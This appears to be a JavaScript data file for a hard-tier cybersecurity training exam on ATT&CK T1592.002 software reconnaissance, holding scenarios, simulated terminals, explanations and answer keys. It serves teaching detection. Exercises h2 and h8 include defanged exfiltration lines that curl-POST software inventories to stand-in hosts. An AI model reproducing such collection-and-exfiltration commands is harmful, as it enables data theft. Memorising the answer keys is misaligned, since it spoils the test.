var EXAM = {"topicId":"t1592.002","topicTitle":"T1592.002 Gather Victim Host Information: Software","batch":3,"sevName":"HARD","sevClass":"sev-hard","difficulty":"hard","passMark":70,"timerSec":3000,"exercises":[{"id":"h1","type":"qcm","title":"Scanner or not?","scenario":[["art","ARTEFACT 1 — perimeter firewall log (excerpt, 40 minutes)","198[.]51[.]100[.]78 → tcp/80   \"HEAD /\"            UA=-\n198[.]51[.]100[.]78 → tcp/443  \"HEAD /\"            UA=-\n198[.]51[.]100[.]78 → tcp/8080 \"GET /manager/html\" UA=-\n198[.]51[.]100[.]78 → tcp/8443 \"HEAD /\"            UA=-\nservices probed: 8 distinct ports · no exploit payload seen"],["art","ARTEFACT 2 — asset register (excerpt)","AcmeScan approved vulnerability scanner\n  mgmt IP: 198[.]51[.]100[.]77\n  window : Tue 02:00-04:00 (maintenance mode otherwise)"],["art","ARTEFACT 3 — server banners captured during the probes","hxxp://web01[.]target-example  Server: Apache/2.4.49 (Unix)\nhxxps://web01[.]target-example Server: Apache/2.4.49 (Unix)"]],"q":"Choose the assessment and action that best fits ALL artefacts.","hint":"Compare the source IP with the asset register digit by digit — and check the clock.","expl":"The source is **198[.]51[.]100[.]78**, the register lists **.77** — this is *not* the approved scanner; the near-miss \"approved activity\" fails on one digit and on the clock (outside the 02:00–04:00 window). Banner sweeps across ports with no payloads map to pre-compromise software/version gathering (T1592.002 pattern via Active Scanning), not T1046 (an internal, post-foothold behaviour — defensible only if the source were internal) and not a web-app attack (no exploit content). The proportionate action is to **block/limit the source and monitor**; reimaging servers for a banner read is disproportionate.","study":"Verify source-vs-asset before accepting any \"approved scanner\" claim.","options":[{"t":"Unapproved external recon of exposed software; block the source and monitor","why":"Correct. Source mismatches the register, banners were harvested, no exploit followed: proportionate response."},{"t":"Approved scanner activity; accept and close the alert","why":"Near-miss. The register lists .77, the traffic came from .78, and the hour is outside the maintenance window."},{"t":"Internal Discovery (T1046); isolate the affected servers","why":"Near-miss. T1046 is internal post-foothold scanning; this source is external, and isolation is disproportionate."},{"t":"Active web exploitation; reimage both web servers","why":"Wrong. HEAD/banner requests carry no exploit payload; reimaging destroys value for a recon event."}],"correct":[0]},{"id":"h2","type":"logview","title":"Escalate only the right lines","scenario":[["p","Two days of process telemetry from the finance segment. A change ticket confirms: \"SCCM nightly hardware/software inventory at 02:00 (service account SCCM-SA)\" and \"February patch window: admins may run package listings\"."],["art","ARTEFACT 1 — context","Tools: SCCM inventory (benign, ticketed) · helpdesk jump host JH-07 · app server APP-03."]],"q":"Click every line that warrants escalation despite looking routine, then Check.","hint":"Three lines break the ticketed pattern: wrong parent, wrong destination, or wrong hour.","expl":"The three alarming lines: **line 2** — `reg query …\\Uninstall /s` over winrm from JH-07 at 03:41 (remote, invasive software inventory outside the ticketed pattern); **line 6** — a task literally named HealthCheck spawning `tasklist /v` and POSTing output to an external host (benign name, exfil-shaped destination); **line 9** — python enumerating dpkg packages and curl-POSTing them out from a finance host. Line 4 is the *ticketed* SCCM inventory (daily, 02:00, SCCM-SA — alarming-looking, benign); line 5 is an admin package listing inside the patch window; lines 1,3,7,8,10 are routine. Escalating the ticketed lines would burn trust; not escalating the three real ones is the miss.","study":"Benign-looking task names and ticketed schedules are the perfect cover — diff behaviour, not labels.","logview":{"click":true,"lines":["03:01 FIN-DB01 user=sqlagent proc=sqlservr normal operation","03:41 JH-07→FIN-PC12 user=helpdesk.a proc=winrm child=\"reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall /s\"","03:44 FIN-PC12 user=helpdesk.a proc=reg exit code 0","02:00 FIN-PC07 user=SCCM-SA proc=\"wmic product get name,version\" parent=ccmexec (nightly inventory)","02:15 FIN-APP02 user=admin.m proc=\"dpkg -l\" parent=bash (patch window, ticketed)","02:20 FIN-PC07 proc=schtasks task=\"HealthCheck\" child=\"tasklist /v\" net=\"POST hxxp://cdn-updates[.]example[.]net/up\"","02:22 FIN-PC07 proc=avscan routine antivirus sweep","02:30 FIN-PC07 proc=backup nightly backup job","02:52 APP-03 user=deploy proc=\"python3 -c import pkg_resources…\" child=\"curl -X POST hxxp://203[.]0[.]113[.]240/collect\"","03:05 APP-03 proc=appsvc normal application restart"],"clickCorrect":[1,5,8],"why":{"0":"Routine database service activity.","1":"Remote, recursive uninstall-key enumeration from the jump host at an odd hour — outside every ticketed pattern.","2":"Continuation of line 2; the evidence anchor is line 2 itself.","3":"Exactly the SCCM nightly inventory from the change ticket: benign despite the scary command.","4":"Package listing inside the announced patch window: benign.","5":"Benign-looking task name, but it ships a process/software list to an external host.","6":"Routine antivirus sweep.","7":"Routine backup.","8":"Software enumeration piped straight to an external collector: exfil-shaped.","9":"Normal application restart."}}},{"id":"h3","type":"terminal","title":"Forensic-safe metadata pull","scenario":[["p","**Environment:** RHEL 8 forensic workstation. The evidence mount `/mnt/evidence` holds `supplier_invoice.pdf` from a compromised vendor. You need the **creating-software string** for the CVE cross-reference the CTI lead requested."],["p","**Constraints:** the file is evidence — read it, change nothing, write nothing back to the mount. The workstation image ships: `exiftool`, `strings`, `file`, `binwalk`. The exercise does not name the tool for you."]],"q":"Produce the creating-software details of supplier_invoice.pdf in the least state-changing way, then Check.","hint":"One available tool was built exactly for reading metadata fields; the others dump raw bytes.","expl":"Canonical: **exiftool /mnt/evidence/supplier_invoice.pdf**. `exiftool` parses document metadata directly (Producer/Application fields). `strings` would eventually show similar text but buries it in noise and can mislead — defensible in a pinch, not the canonical answer (partial credit if you used it). Any redirect (`>`), copy, or in-place change on an evidence mount is a state change and was scored as a wrong element. This is the same metadata class the T1592.002 page describes as an attack vector — here you used it for defense.","study":"exiftool = metadata reader. On evidence: read-only always.","terminal":{"termTitle":"simulation only — nothing real is executed","user":"ir@forensic-ws","prompt":"ir@forensic-ws:~$","welcome":["# evidence mount: /mnt/evidence (read-only recommended)","# available: exiftool  strings  file  binwalk"],"tools":["exiftool","strings","file","binwalk"],"expected":"exiftool /mnt/evidence/supplier_invoice.pdf","outsim":[{"re":"^exiftool","out":["Producer          : Microsoft Word for Microsoft 365","Application       : Microsoft Office Word","Create Date       : 2026:01:14 09:41:03"]},{"re":"^strings","out":["%!PS-Adobe-3.0 … (thousands of raw lines)","#Publisher#Microsoft Word for Microsoft 365 … buried in noise"]},{"re":"^(file|binwalk)","out":["file: PDF document, version 1.7 / binwalk: PDF signature at 0 — no metadata fields printed"]}],"defaultOut":["(the command runs)"],"elements":[{"re":"^exiftool","label":"tool: exiftool (metadata reader)","why":"Purpose-built, clean output, read-only."},{"re":"supplier_invoice\\.pdf","label":"target: /mnt/evidence/supplier_invoice.pdf","why":"The evidence file named in the task."}],"parts":["`exiftool` — parses document metadata without altering the file.","target path — the evidence PDF; output is the Producer/Application strings for the CVE check."],"bad":[{"re":"(>>|\\s>\\s|\\s>$|tee |cp |mv |rm |chmod |touch )","label":"state-changing operation on evidence","why":"Redirects or copies alter the evidence mount or your chain of custody."}]}},{"id":"h4","type":"tree","title":"Conflicting signals — the offline scanner","scenario":[["art","ARTEFACT 1 — maintenance calendar","AcmeScan vulnerability scanner: OFFLINE for vendor migration\nTue 02:00-04:00 — no scans scheduled this week"],["art","ARTEFACT 2 — perimeter firewall","02:14-03:58  src 198[.]51[.]100[.]77 (AcmeScan mgmt IP)\nsweeping tcp/80,443,8080 across the DMZ — banner capture pattern"],["art","ARTEFACT 3 — EDR","no process-level enumeration on any DMZ host in the window"]],"q":"Resolve the conflict between the calendar and the firewall, then decide.","hint":"One artefact describes intent, another describes observed traffic — only one source can tell you what the scanner itself did.","expl":"Two signals contradict: the calendar says the scanner was offline; the firewall says its exact IP scanned. The correct path verifies the **scanner vendor's own job logs** (the only authoritative record of what the scanner ran), gathers more evidence instead of acting on the network, preserves perimeter logs, and only then classifies. Blocking the scanner range risks breaking approved scanning if the calendar is wrong; declaring an insider or closing as false positive both jump ahead of the evidence. If vendor logs confirm the scanner was off, the residual reading is impersonation of its IP for pre-compromise recon (T1592.002/T1595 pattern).","study":"When signals conflict, find the source that can falsify one of them.","steps":[{"q":"Step 1 — Which source do you verify first?","opts":[{"t":"The scanner vendor's own job/run logs","ok":true,"why":"Only the scanner knows whether it scanned; its logs can falsify one side of the conflict.","out":"You raise a priority request with the scanner owner. Logs pending — decision deferred."},{"t":"Trust the maintenance calendar and close the alert","ok":false,"why":"A calendar states intent, not what actually ran; it cannot explain observed traffic.","out":"The alert closes; the sweep continues unobserved into the evening."},{"t":"Trust the firewall and declare a major incident now","ok":false,"why":"The firewall cannot tell you whose hand was on the scanner either; escalation is premature.","out":"Major incident declared; the scanner owner calls back mid-escalation with job logs that change everything."}]},{"q":"Step 2 — While waiting for vendor logs, what is your working position?","opts":[{"t":"Unverified — gather more evidence, no network action yet","ok":true,"why":"At least one exercise in this exam rewards restraint; this is it. Acting early has real cost either way.","out":"You preserve firewall/NetFlow data and watch the source. Nothing is broken regardless of the outcome."},{"t":"Assume the calendar is wrong; treat it as the scanner","ok":false,"why":"Plausible, but it is a guess — and if wrong, you have normalised an impersonation.","out":"The alert is downgraded on a hunch; the source resumes the next night unchallenged."},{"t":"Assume an insider is driving the scanner","ok":false,"why":"No insider evidence exists; EDR shows nothing and the source is the scanner IP.","out":"An innocent platform team is interviewed twice; trust and hours are burned."}]},{"q":"Step 3 — Which interim containment is proportionate?","opts":[{"t":"Targeted monitoring plus log preservation only","ok":true,"why":"Keeps all options open, costs nothing, destroys nothing.","out":"A watch rule is set on 198[.]51[.]100[.]77; firewall logs are exported and hashed."},{"t":"Block the whole scanner IP range at the perimeter","ok":false,"why":"If the scanner is legitimate, you just broke approved scanning — a real business cost.","out":"Tuesday's approved scan fails; two risk reports open against your team."},{"t":"Reboot the scanner to \"reset\" it","ok":false,"why":"You would destroy volatile state on the very device that must be examined.","out":"Memory and run queues vanish; the vendor ticket becomes a forensic complaint."}]},{"q":"Step 4 — Vendor logs confirm: no job ran in the window. Classify the event.","opts":[{"t":"Suspected impersonation of the scanner IP; pre-compromise recon","ok":true,"why":"The scanner was dark, yet its IP swept banners — impersonation for recon (T1592.002/T1595 pattern) is the supported reading.","out":"The report goes out with the evidence chain attached; the perimeter team hunts the true source."},{"t":"Confirmed insider threat","ok":false,"why":"Nothing ties a person to the traffic; \"insider\" overstates the evidence.","out":"HR is engaged prematurely; the legal review finds no grounds."},{"t":"False positive — delete the ticket","ok":false,"why":"The traffic was real and unexplained; deleting the record erases the anomaly.","out":"The ticket is gone; next week's identical sweep has no baseline to compare against."}]}]},{"id":"h5","type":"qcm","title":"Quiet pre-deal recon","scenario":[["p","**Setting (red-team planning, fully authorised):** a client suspects a hostile acquirer is profiling them before a tender. You must demonstrate how the acquirer could inventory host software **without ever touching the target's network** and without alerting anything. Constraints: zero packets to the target, two-day budget."]],"q":"Which approach satisfies both constraints?","hint":"The ATT&CK page lists collection ways that need no packets at all.","expl":"The page names **accessible data sets** — job postings, network maps, assessment reports, resumes, purchase invoices — and **file metadata** on victim-owned websites. Both are passive: no packets, low cost, hard to attribute. An nmap sweep fails the zero-packet constraint (the \"obvious\" choice is wrong here); a profiler script needs a compromised site first (touching them); emailing the target is not recon at all.","study":"Passive-first tradecraft: datasets and metadata before any scan.","options":[{"t":"Mine job postings, CVs and published-file metadata for software names","why":"Correct. Named on the page, packet-free, and slow to notice."},{"t":"Run nmap -sV across the entire public range","why":"Near-miss. Accurate technique (T1595.002), but it violates the zero-packet constraint and trips perimeter sensors."},{"t":"Seed their news site with a visitor-profiling script","why":"Near-miss. The Andariel pattern — but it requires compromising their site first: touching the target."},{"t":"Email the target CISO requesting the asset inventory","why":"Wrong. That is social engineering of the defender, not host-software recon, and it burns the operation."}],"correct":[0]},{"id":"h6","type":"dnd","title":"Sort the T1592 family","scenario":[["p","Six findings from a recon exercise must be filed under the correct T1592 sub-technique. Each finding has exactly one right home."]],"q":"Drag each finding onto its correct sub-technique bucket.","help":"Drag the chips, or click a chip and then click a bucket.","hint":"Hardware = physical parts. Software = programs and versions. Firmware = BIOS/UEFI layer.","expl":"**T1592.001 Hardware:** GPU/RAM sizing and CPU core counts — physical characteristics. **T1592.002 Software:** the Apache banner and the PDF Producer field — programs and versions (the latter via metadata, as the page describes). **T1592.003 Firmware:** BIOS/UEFI version strings. **T1592.004 Client Configurations:** the visitor browser/plugin configuration — the classic near-miss is dropping it into Software, but client *configurations of client software* is its own sub-technique.","study":"The four siblings: Hardware, Software, Firmware, Client Configurations.","zones":[{"id":"z1","label":"T1592.001 — Hardware"},{"id":"z2","label":"T1592.002 — Software"},{"id":"z3","label":"T1592.003 — Firmware"},{"id":"z4","label":"T1592.004 — Client Configurations"}],"chips":[{"id":"c1","t":"GPU model and installed RAM size"},{"id":"c2","t":"Server banner: Apache/2.4.49"},{"id":"c3","t":"BIOS/UEFI version string of a workstation"},{"id":"c4","t":"PDF Producer: Microsoft Word 2013"},{"id":"c5","t":"CPU core count from a benchmark page"},{"id":"c6","t":"Visitor browser plugin configuration"}],"correct":{"c1":"z1","c2":"z2","c3":"z3","c4":"z2","c5":"z1","c6":"z4"},"chipWhy":{"c1":"Physical components → Hardware (T1592.001).","c2":"A program name and version → Software (T1592.002).","c3":"BIOS/UEFI is firmware → T1592.003.","c4":"The creating program of a document → Software via metadata (T1592.002).","c5":"CPU details are physical characteristics → Hardware (T1592.001).","c6":"Visitor client software configuration is exactly what T1592.004 covers."}},{"id":"h7","type":"multi","title":"Flaws in the analytic","scenario":[["art","ARTEFACT 1 — proposed SIEM analytic \"software-inventory-commands\"","line 1  MATCH process_command_line CONTAINS \"tasklist\" OR \"wmic product\"\nline 2  SCOPE   ANY user, ANY host, ANY time of day\nline 3  SEVERITY critical\nline 4  RESPONSE auto-isolate the source host from the network\nline 5  ALERT   route to SOC queue with runbook link"],["p","In one pilot day the rule fired 214 times. SCCM, helpdesk tooling and backup jobs all run these commands on schedule."]],"q":"Click the TWO lines whose logic is flawed for this analytic.","hint":"One flaw floods the queue; one is a response no recon-only signal should trigger.","expl":"**Line 2** is the detection flaw: ANY/ANY/ANY guarantees a false-positive flood because admin tooling runs these commands routinely — condition instead on rare parents, unusual hours, or external initiators (the DET0888 tuning lesson). **Line 4** is the response flaw: auto-isolation on a recon-only command signal is disproportionate (the least-aggressive principle) and, executed at scale, becomes its own outage. Lines 1, 3 and 5 are crude but functional: the pattern text matches, criticality is a tunable judgement, and the runbook link is good practice.","study":"Tune scope before severity; never automate a disruptive response on a noisy signal.","options":[{"t":"line 1 — the command match text","why":"Functional. The strings do appear in the behaviour; crude but not the flaw to fix first."},{"t":"line 2 — ANY user, ANY host, ANY time","why":"Correct flaw. Untuned scope = 214 fires/day; admin schedules guarantee it."},{"t":"line 3 — severity critical","why":"Harsh, but a calibration choice — not the structural flaw in scope or response."},{"t":"line 4 — auto-isolate the source host","why":"Correct flaw. Automated disruption on a noisy recon signal is disproportionate."},{"t":"line 5 — alert routing with runbook","why":"Good practice, not a flaw."}],"correct":[1,3]},{"id":"h8","type":"multi","title":"Benign script turned collector","scenario":[["art","ARTEFACT 1 — change ticket #4471","\"SoftwareAudit.ps1\" scheduled GPO script update — standard quarterly\nsoftware inventory for asset management. Runs 02:00, silent. — Approved."],["art","ARTEFACT 2 — baseline diff of SoftwareAudit.ps1","  Get-WmiObject Win32_Product | Export-Csv \\\\fs01\\audit\\sw.csv   (unchanged)\n+ reg query HKLM\\...\\Uninstall /s /fo csv | curl -X POST --data @- \n+   hxxp://cdn-updates[.]example[.]net/up                            (NEW)"],["art","ARTEFACT 3 — proxy log","02:03 FIN-PC12 → cdn-updates[.]example[.]net:80  POST  4.2 MB  \"curl/windows\""]],"q":"Select the THREE facts that prove exfiltration intent (not just sloppy scripting).","hint":"Compare the diff against the ticket: what changed, where does it go, how visible is it?","expl":"The three proof points: a **new external destination** absent from the approved ticket (`cdn-updates[.]example[.]net`); the **pipeline itself** — a full recursive uninstall-key inventory piped as a POST body to that host (4.2 MB seen in the proxy log); and the **silent pattern** — stdin-piped POST with no local output or log line, unlike the unchanged Export-Csv path. \"Script name unchanged\" and \"runs at 02:00\" both match the ticket, so they support the benign cover story, not the intent. This is the benign-looking-but-alarming case: the ticket is the camouflage.","study":"Diff against approved change, not against yesterday: intent hides in deltas.","options":[{"t":"A new external destination not named in the change ticket","why":"Correct. The approved change never mentions this host."},{"t":"The full software inventory is POSTed to that external host","why":"Correct. Data volume and direction match collection, not asset management."},{"t":"The new line runs silently with no local output or logging","why":"Correct. The old path wrote a visible CSV; the new one hides its output."},{"t":"The script name stayed \"SoftwareAudit.ps1\"","why":"Wrong. That continuity is the camouflage, not proof of intent."},{"t":"It runs at 02:00 like every patch window","why":"Wrong. The schedule matches the ticket — another camouflage element."}],"correct":[0,1,2]},{"id":"h9","type":"qcm","title":"Shape of the analytic","scenario":[["p","You own detection strategy **DET0888** (\"Detection of Software\"): internet scanners looking for patterns of malicious content that collects host software information. Known headwinds per the ATT&CK analytic AN2020: very high occurrence and false-positive rate, often outside your visibility."]],"q":"Which analytic shape gives the best signal inside those constraints?","hint":"The page warns about occurrence and false positives — the shape must survive both.","expl":"The workable shape correlates the recon *pattern*: banner/version probes (HEAD, /server-status), **rare user agents** (NSE, curl), **distinct external sources**, over a rolling window — matching how the page describes collection, while keeping the high-FP problem manageable. Alerting on every 404 or every PDF download drowns in noise (customers download PDFs all day), and blocking all non-browser user agents is the \"best practice\" that breaks partner APIs and is trivially evaded with a browser string — wrong here.","study":"Pattern correlation beats single-event alerts for high-occurrence recon.","options":[{"t":"Correlate banner probes, rare user agents and external sources","why":"Correct. Mirrors the collection pattern while damping the documented false-positive rate."},{"t":"Alert on every HTTP 404 response the site returns","why":"Wrong. 404s are constant background noise; occurrence would be overwhelming."},{"t":"Alert on every PDF download from the public site","why":"Wrong. Customers download PDFs daily; the FP rate would kill the rule."},{"t":"Block every non-browser user agent at the WAF edge","why":"Near-miss \"best practice\". Breaks partner/API clients, and any actor can send a browser string."}],"correct":[0]},{"id":"h10","type":"terminal","title":"Pipeline: distinct user agents","scenario":[["p","**Environment:** bash on the SOC jump host (clean). The file `access.log` is combined format: `ip - - [time] \"request\" status \"referer\" \"ua\"` — the user agent is the **6th quote-field**. Logs rotate in 20 minutes."],["p","**Task:** the CTI lead needs one number for the report: how many **distinct** user agent strings did `203[.]0[.]113[.]77` use during its probing session? No tool is named for you."]],"q":"Build the pipeline that prints that single number, run it, then Check.","hint":"Filter by the IP, cut out the UA field, keep unique values, count the lines.","expl":"Canonical: **grep '203[.]0[.]113[.]77' access.log | awk -F\"\\\"\" '{print $6}' | sort -u | wc -l**. Four elements: grep filters to the actor; awk takes field 6 between quotes (the UA); sort -u keeps distinct values; wc -l prints the count (here: 4). `uniq -c` looks close but counts occurrences per value — not the number of distinct strings. cat would flood the terminal and leak raw IPs into the report; a missing sort -u or wc changes the answer.","study":"Filter → extract → unique → count: the analyst pipeline worth memorising.","terminal":{"termTitle":"simulation only — nothing real is executed","user":"analyst@jumphost","prompt":"analyst@jumphost:~$","welcome":["# access.log — combined format, UA is the 6th quote-field","# logs rotate in 20 minutes"],"tools":["grep","awk","cut","sort","uniq","wc","cat"],"expected":"grep '203[.]0[.]113[.]77' access.log | awk -F'\"' '{print $6}' | sort -u | wc -l","outsim":[{"re":"awk.*wc|wc.*awk","out":["4"]},{"re":"awk","out":["Mozilla/5.0 (compatible; Nmap Scripting Engine)","curl/7.68.0","python-requests/2.25","-"]},{"re":"sort -u","out":["Mozilla/5.0 (compatible; Nmap Scripting Engine)","curl/7.68.0","python-requests/2.25","-"]},{"re":"^cat","out":["(the full log floods the output — raw IPs and all)"]}],"defaultOut":["(the command runs)"],"elements":[{"re":"grep.*203\\[\\.\\]0\\[\\.\\]113\\[\\.\\]77","label":"grep filter on the actor IP","why":"Only that source matters for the session."},{"re":"awk|cut","label":"UA field extraction (awk/cut on the quote-fields)","why":"Field 6 between quotes is the user agent."},{"re":"sort -u|sort +u","label":"sort -u to keep distinct values","why":"Distinct means unique values, not raw counts."},{"re":"wc -l|wc -l ","label":"wc -l to print the final number","why":"The deliverable is one number."}],"parts":["`grep 'IP'` — keep only the actor's lines.","`awk -F\"\\\"\" '{print $6}'` — the UA field (6th quote-delimited field).","`sort -u` — distinct values only.","`wc -l` — the count of distinct UAs (answer: 4)."],"bad":[{"re":"uniq -c","label":"uniq -c instead of sort -u | wc -l","why":"Counts occurrences per UA; the task asks for the number of distinct strings."}]}},{"id":"h11","type":"rank","title":"Fix order for the exposure report","scenario":[["p","Four findings from the monthly external-exposure review must be fixed. The CISO wants the order to reflect **attacker value** — what recon (T1592.002-style) and exploitation would profit from most."]],"q":"Rank the findings: Rank 1 = fix first.","rankNote":"Rank 1 = fix first. Drag or use the arrows.","hint":"Known-exploit exposure beats banner cosmetics; data leaks feed recon chains.","expl":"**Rank 1:** Apache 2.4.49 has the public path-traversal CVE-2021-41773 — recon found it, exploitation is one search away. **Rank 2:** the dev portal publishes supplier invoices naming the software estate — a passive T1592.002 feed that must stop. **Rank 3:** the 2012 JetDirect banner is a low-value, low-reach exposure. **Rank 4:** nginx 1.24.0 is patched and current; its banner is cosmetic (M1056 would still trim it). Near-miss reasoning: banner-bling first looks tidy but fixes the least exploitable item.","study":"Prioritise by exploitability and intel value, not by how loud the finding sounds.","correct":["FINDING 1 — Apache/2.4.49 exposed, public path-traversal CVE-2021-41773","FINDING 2 — dev portal publishes supplier invoices listing the software estate","FINDING 3 — printer answers with \"HP JetDirect, 2012 firmware\" on tcp/9100","FINDING 4 — nginx/1.24.0 banner on a fully patched host"],"itemWhy":["A public, weaponisable CVE on an exposed service is the direct entry risk.","The invoice leak keeps feeding passive recon every day it stays up.","Old but low-value and low-reach; schedule it after the top two.","Patched software: banner removal is hygiene, not risk reduction."]},{"id":"h12","type":"qcm","title":"Attribution discipline","scenario":[["art","ARTEFACT 1 — intel snippet (public reporting)","Magic Hound (G0059): captured user-agent strings from visitors\nto its phishing sites — a documented T1592.002 procedure example."],["art","ARTEFACT 2 — your case","A phishing page in your incident records visitor user agents and\nserver banners before redirecting. Tooling: commodity nmap + a\ncopy-pasted profiler script. No infrastructure overlap with\npreviously reported Magic Hound staging."]],"q":"The junior says: \"It's Magic Hound, confirmed.\" What is the defensible assessment?","hint":"One shared technique is common property; ask what independent evidence exists.","expl":"A **technique-level match alone gives low confidence** — the page itself shows Magic Hound doing this, but any actor can copy a profiler script, and your case shows commodity tooling with no infrastructure overlap. The defensible wording: behaviour consistent with the published G0059 procedure example; **low confidence pending independent evidence** (infra, timing, targeting). \"Confirmed\" overstates; \"technique is unique\" is factually wrong; \"ignore entirely\" throws away a reportable signal.","study":"TTPs are copied freely — attribution needs independent evidence layers.","options":[{"t":"Consistent with G0059 reporting; low confidence pending more evidence","why":"Correct. Names the match, states the confidence honestly, defines what would raise it."},{"t":"Confirmed Magic Hound campaign against our company","why":"Near-miss. One technique match with commodity tools cannot carry \"confirmed\"."},{"t":"This technique is unique to the Magic Hound toolkit","why":"Wrong. Any actor can run a UA collector; techniques are not signatures."},{"t":"Ignore it — every actor scans banners, so it means nothing","why":"Wrong. Common does not mean worthless; it is still reportable recon behaviour."}],"correct":[0]},{"id":"h13","type":"order","title":"Order the recon-to-access chain","scenario":[["p","Five events from one actor's operation against your company. Reconstruct the order — one event type belongs to a *later* ATT&CK tactic."]],"q":"Drag the events into the true chronological order (first at top).","hint":"Software details must exist before CVE lookup; capability before login.","expl":"**Order:** probe banners/user agents → collect versions from document metadata (both T1592.002 patterns) → cross-reference versions with public CVE databases (T1597) → develop or obtain the exploit (T1587/T1588) → log in through the exposed VPN (T1133, Initial Access). The chain is the page's own narrative: gather → cross-reference with CVEs → build capabilities → initial access.","study":"Recite the chain: recon → CVE → capability → access.","correct":["Banner and user agent probing of exposed services","Software versions extracted from published document metadata","Versions cross-referenced with public CVE databases (T1597)","Exploit capability developed or obtained (T1587/T1588)","Login attempt through the exposed VPN (T1133)"],"itemWhy":["Active scanning artefacts come first — they need no access.","Metadata harvesting runs alongside or right after probing.","CVE lookup needs the version list, so it follows collection.","A capability must exist before an access attempt makes sense.","T1133 login is Initial Access — after everything above."]},{"id":"h14","type":"multi","title":"Detection gap to fund","scenario":[["art","ARTEFACT 1 — detection coverage (this quarter)","T1595   active scanning ......... covered (IDS signatures)\nT1190   exploit public app ...... covered (WAF + EDR)\nT1133   external remote svc ..... covered (VPN login analytics)"],["art","ARTEFACT 2 — tracked actor playbook","T1592.002 → T1588 → T1133: they profile our software, obtain a\ncapability, then attempt VPN access with new tooling."]],"q":"Select the TWO investments that close the biggest playbook gaps.","hint":"Fund what the playbook uses but your coverage table does not list.","expl":"The playbook uses **T1592.002** (now covered — banner/metadata analytics plus canary documents) and **T1588** (watch for newly obtained capability signatures), and both are absent from the coverage table. More T1133 rules duplicate existing coverage, and the mobile matrix is the wrong platform for an enterprise playbook.","study":"Coverage tables + actor playbooks = your gap list, ranked.","options":[{"t":"Banner/metadata recon analytics + canary documents (T1592.002)","why":"Correct. The playbook's first stage is currently invisible to you."},{"t":"Hunt for new capability signatures (T1588 coverage)","why":"Correct. New tooling before VPN use is the second uncovered stage."},{"t":"More VPN brute-force rules for T1133","why":"Wrong. T1133 is already covered per the table."},{"t":"Extend coverage into the mobile ATT&CK matrix","why":"Wrong. The actor playbook is enterprise; mobile adds nothing here."}],"correct":[0,1]},{"id":"h15","type":"qcm","title":"Least aggressive correct action","scenario":[["p","Status after two days: confirmed external banner/metadata recon from one source. **No** exploit attempt, no internal contact, no anomalous auth. The site must stay up — revenue depends on it."]],"q":"Choose the response that fits the evidence.","hint":"Every disruptive option must buy something the evidence says you need.","expl":"Evidence says: recon only, no intrusion. The fitting response shrinks the target (strip banners/metadata — M1056), plants tripwires (canary documents), keeps watching the source. Isolation, reimaging, or taking the site offline all impose real cost while addressing a threat stage that has not happened — each defensible only *after* exploitation evidence appears.","study":"Match response weight to lifecycle stage: recon is answered by exposure reduction.","options":[{"t":"Strip banners/metadata, add canary files, keep monitoring the source","why":"Correct. Directly reduces the technique's value at zero service cost."},{"t":"Isolate both web servers from the network immediately","why":"Near-miss in an intrusion; here it is self-inflicted outage for a recon-only event."},{"t":"Reimage the entire web tier during the night window","why":"Wrong. Nothing indicates compromise; reimaging destroys forensic ground for nothing."},{"t":"Take the public site offline for a full week","why":"Wrong. Maximum business cost, no evidence to justify it."}],"correct":[0]},{"id":"h16","type":"tree","title":"Dual view — one scan, two sides","scenario":[["art","ARTEFACT 1 — nmap -sV output (captured in a rules-of-engagement test)","PORT    STATE SERVICE VERSION\n22/tcp  open  ssh     OpenSSH 7.4\n80/tcp  open  http    Apache httpd 2.4.49\n443/tcp open  ssl/http Apache httpd 2.4.49"],["p","You will look at the same artefact twice: once as the red teamer holding the scan, once as the blue teamer who must catch the next one."]],"q":"Answer both perspectives in the two steps.","hint":"Red side: versions feed public databases. Blue side: the scanner announced itself.","expl":"**Red:** the versions are the product — Apache 2.4.49 and OpenSSH 7.4 map to public CVEs, feeding capability development (T1587/T1588) per the page's CVE cross-reference logic; ransomware/DDoS would waste the recon and violate the engagement logic. **Blue:** the scan is catchable — IDS service-scan signatures, the NSE user agent in web logs, and banner-request rate are exactly the DET0888 pattern; DHCP and badge records never see TCP probes. The exercise is the dual-perspective requirement in one scenario.","study":"Same artefact: red asks \"what next\", blue asks \"what missed\".","steps":[{"q":"Step 1 — RED: what is the ATT&CK-consistent next move?","opts":[{"t":"Research public CVEs for the captured versions and prepare capabilities","ok":true,"why":"Versions → CVE cross-reference → capability development: the page's own chain.","out":"The test log records T1592.002 → T1597 → T1587; the report writes itself."},{"t":"Deploy ransomware across the target now","ok":false,"why":"No access path yet, and it skips every phase the scan just enabled.","out":"The engagement is paused; the client reviews the rules of engagement with legal."},{"t":"Launch a DDoS against the web tier","ok":false,"why":"Availability attack, not recon follow-up; nothing in the scan supports it.","out":"Traffic is filtered upstream; the red team gains nothing reportable."}]},{"q":"Step 2 — BLUE: which telemetry catches this scan next time?","opts":[{"t":"IDS scan signatures + NSE user agent in web logs + banner-request rate","ok":true,"why":"The DET0888 pattern: tool UA, probe cadence, banner pulls — all recorded.","out":"A tuned rule fires on NSE UAs within minutes in the next test round."},{"t":"DHCP lease logs","ok":false,"why":"Address assignment says nothing about TCP probes or banners.","out":"The hunt through DHCP ends with zero relevant events."},{"t":"Door badge records","ok":false,"why":"Physical access data is blind to remote scanning.","out":"Badge review closes with nothing to add."}]}]}],"intro":{"tagline":"Senior-analyst tier: subtle distractors, near-miss answers, and traps.","about":"\n<p>You are now working the <b>HARD</b> tier of <b>T1592.002 — Software</b> (sub-technique of <b>T1592 Gather Victim Host Information</b>, tactic <b>Reconnaissance</b>, platform <b>PRE</b>). At this level the scenarios stop guiding you. Artefacts look alike, the obvious answer is sometimes wrong, and the correct action is often the <b>least aggressive</b> one.</p>\n<p>The technique itself: adversaries learn which <b>software types and versions</b> run on victim hosts, including <b>defensive components</b> (antivirus, SIEMs). Collection runs through <b>Active Scanning</b> (listening ports, server banners, user agent strings), <b>Phishing for Information</b>, <b>malicious content on compromised sites</b> (the Andariel and Magic Hound pattern), <b>accessible data sets</b> (job postings, network maps, assessment reports, resumes, purchase invoices), and <b>file metadata</b> whose versions are cross-referenced with <b>CVEs</b> to plan exploitation. Findings feed T1593/T1597 (more recon), T1587/T1588 (capability development), and initial access through <b>T1133 External Remote Services</b> or <b>T1195 Supply Chain Compromise</b>.</p>\n<p>Procedure examples you must be able to quote: <b>Andariel (G0138)</b> planted scripts in compromised websites collecting browser type, system language and Flash Player version; <b>Magic Hound (G0059)</b> captured user-agent strings on phishing sites; <b>Sandworm Team (G0034)</b> researched software code for supply-chain operations (NotPetya 2017) and collected lists of computers running specific software for targeting; the 